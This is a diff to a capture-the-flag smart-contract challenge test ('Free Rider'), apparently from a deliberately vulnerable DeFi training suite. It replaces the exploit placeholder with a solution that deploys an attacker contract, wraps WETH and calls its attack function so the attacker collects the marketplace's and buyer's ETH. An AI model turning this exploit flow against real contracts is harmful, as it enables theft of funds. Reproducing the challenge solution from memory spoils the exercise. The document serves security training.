@@ -10,9 +10,10 @@ describe('[Challenge] Free Rider', function () {
     let deployer, attacker, buyer;
 
     // The NFT marketplace will have 6 tokens, at 15 ETH each
-    const NFT_PRICE = ethers.utils.parseEther('15')
+    const NFT_PRICE = ethers.utils.parseEther('15');
     const AMOUNT_OF_NFTS = 6;
     const MARKETPLACE_INITIAL_ETH_BALANCE = ethers.utils.parseEther('90');
+    const TOKEN_IDS = [0, 1, 2, 3, 4, 5];
 
     // The buyer will offer 45 ETH as payout for the job
     const BUYER_PAYOUT = ethers.utils.parseEther('45');
@@ -90,7 +91,7 @@ describe('[Challenge] Free Rider', function () {
 
         // Open offers in the marketplace
         await this.marketplace.offerMany(
-            [0, 1, 2, 3, 4, 5],
+            TOKEN_IDS,
             [NFT_PRICE, NFT_PRICE, NFT_PRICE, NFT_PRICE, NFT_PRICE, NFT_PRICE]
         );
         expect(await this.marketplace.amountOfOffers()).to.be.eq('6');
@@ -101,10 +102,36 @@ describe('[Challenge] Free Rider', function () {
             this.nft.address, 
             { value: BUYER_PAYOUT }
         );
+
+        const FreeRiderAttackerFactory = await ethers.getContractFactory('FreeRiderAttacker', attacker);
+        this.attackerContract = await FreeRiderAttackerFactory.deploy(
+            this.buyerContract.address,
+            this.marketplace.address,
+            this.nft.address,
+            this.weth.address,
+            this.uniswapFactory.address,
+            this.token.address,
+            TOKEN_IDS,
+        );
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        let tx;
+
+        const ETH_TO_WRAP = ethers.utils.parseEther("0.3");
+        const ETH_NEEDED_FOR_SALE = NFT_PRICE * AMOUNT_OF_NFTS;
+
+        console.log('wrap ether');
+        tx = await this.weth.connect(attacker).deposit({ value: ETH_TO_WRAP });
+        await tx.wait();
+
+        console.log('transfer weth to contract');
+        tx = await this.weth.connect(attacker).transfer(this.attackerContract.address, ETH_TO_WRAP);
+        await tx.wait();
+
+        console.log('attack!');
+        tx = await this.attackerContract.attack(ETH_NEEDED_FOR_SALE.toString());
+        await tx.wait();
     });
 
     after(async function () {
@@ -113,7 +140,6 @@ describe('[Challenge] Free Rider', function () {
         // Attacker must have earned all ETH from the payout
         expect(await ethers.provider.getBalance(attacker.address)).to.be.gt(BUYER_PAYOUT);
         expect(await ethers.provider.getBalance(this.buyerContract.address)).to.be.eq('0');
-
         // The buyer extracts all NFTs from its associated contract
         for (let tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
             await this.nft.connect(buyer).transferFrom(this.buyerContract.address, buyer.address, tokenId);
